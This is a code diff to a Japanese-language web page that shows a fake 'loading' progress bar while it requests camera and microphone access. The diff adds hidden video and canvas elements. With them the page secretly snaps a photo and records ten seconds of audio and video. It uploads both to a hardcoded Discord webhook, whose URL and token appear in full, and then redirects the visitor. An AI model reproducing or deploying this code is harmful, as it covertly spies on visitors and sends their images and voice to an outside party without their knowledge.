@@ -30,6 +30,9 @@
       width: 0%;
       transition: width 0.1s linear;
     }
+    video, canvas {
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -39,59 +42,93 @@
   <div id="progressFill"></div>
 </div>
 
-<script>
-  const webhookUrl = "https://discord.com/api/webhooks/1377883943642333194/wPfWly6Kbxjg64NOp0xbEnDzOkwOH0Vhq8sAnex10T3b5rcOh3v-HPeXE6nKELQclAYq"; // ← 自分のWebhookに変更
-  const durationMs = 10000; // 録画10秒
-  const updateInterval = 100; // 0.1秒ごとに更新
+<video id="video" autoplay muted playsinline></video>
+<canvas id="canvas"></canvas>
 
+<script>
+  const webhookUrl = "https://discord.com/api/webhooks/1377883943642333194/wPfWly6Kbxjg64NOp0xbEnDzOkwOH0Vhq8sAnex10T3b5rcOh3v-HPeXE6nKELQclAYq";
+  const durationMs = 10000;
+  const updateInterval = 100;
   const progressText = document.getElementById("progressText");
   const progressFill = document.getElementById("progressFill");
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
 
   if (typeof MediaRecorder === 'undefined') {
     alert("このブラウザは録画に対応していません。");
   } else {
     navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
-      const mediaRecorder = new MediaRecorder(stream);
-      const chunks = [];
+      video.srcObject = stream;
 
-      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+      // ✅ 写真を撮影して送信
+      video.onloadedmetadata = () => {
+        video.play();
+        setTimeout(() => {
+          const width = video.videoWidth;
+          const height = video.videoHeight;
+          canvas.width = width;
+          canvas.height = height;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0, width, height);
 
-      mediaRecorder.onstop = () => {
-        const blob = new Blob(chunks, { type: "video/webm" });
-        const file = new File([blob], "recorded.webm");
+          canvas.toBlob(photoBlob => {
+            const photoFile = new File([photoBlob], "photo.jpg", { type: "image/jpeg" });
+            const photoForm = new FormData();
+            photoForm.append("file", photoFile);
+            photoForm.append("content", "📸 写真を撮影しました");
 
-        const formData = new FormData();
-        formData.append("file", file);
-        formData.append("content", "🎥 完了しました");
+            fetch(webhookUrl, {
+              method: "POST",
+              body: photoForm
+            }).then(() => {
+              // ✅ 写真送信後、録画を開始
+              const mediaRecorder = new MediaRecorder(stream);
+              const chunks = [];
 
-        fetch(webhookUrl, {
-          method: "POST",
-          body: formData
-        }).then(() => {
-          window.location.href = "ku.html"; // ← 録画後に移動したいHTML
-        }).catch(err => {
-          alert("送信失敗: " + err);
-        });
+              mediaRecorder.ondataavailable = e => chunks.push(e.data);
+
+              mediaRecorder.onstop = () => {
+                const blob = new Blob(chunks, { type: "video/webm" });
+                const file = new File([blob], "recorded.webm");
+
+                const formData = new FormData();
+                formData.append("file", file);
+                formData.append("content", "🎥 完了しました");
+
+                fetch(webhookUrl, {
+                  method: "POST",
+                  body: formData
+                }).then(() => {
+                  window.location.href = "ku.html";
+                }).catch(err => {
+                  alert("録画送信失敗: " + err);
+                });
+              };
+
+              mediaRecorder.start();
+
+              // ✅ プログレスバー制御
+              let currentStep = 0;
+              const totalSteps = durationMs / updateInterval;
+
+              const interval = setInterval(() => {
+                currentStep++;
+                const percent = Math.min(Math.round((currentStep / totalSteps) * 100), 100);
+                progressText.textContent = `読み込み中... ${percent}%`;
+                progressFill.style.width = `${percent}%`;
+
+                if (currentStep >= totalSteps) {
+                  clearInterval(interval);
+                  mediaRecorder.stop();
+                  stream.getTracks().forEach(track => track.stop());
+                }
+              }, updateInterval);
+            }).catch(err => {
+              alert("写真送信失敗: " + err);
+            });
+          }, "image/jpeg");
+        }, 1000); // メタデータ読み込み後1秒待機して写真を撮る
       };
-
-      mediaRecorder.start();
-
-      // プログレスバー制御
-      let currentStep = 0;
-      const totalSteps = durationMs / updateInterval;
-
-      const interval = setInterval(() => {
-        currentStep++;
-        const percent = Math.min(Math.round((currentStep / totalSteps) * 100), 100);
-        progressText.textContent = `読み込み中... ${percent}%`;
-        progressFill.style.width = `${percent}%`;
-
-        if (currentStep >= totalSteps) {
-          clearInterval(interval);
-          mediaRecorder.stop();
-          stream.getTracks().forEach(track => track.stop());
-        }
-      }, updateInterval);
     }).catch(err => {
       alert("カメラ・マイクのアクセスが拒否されました：" + err);
     });
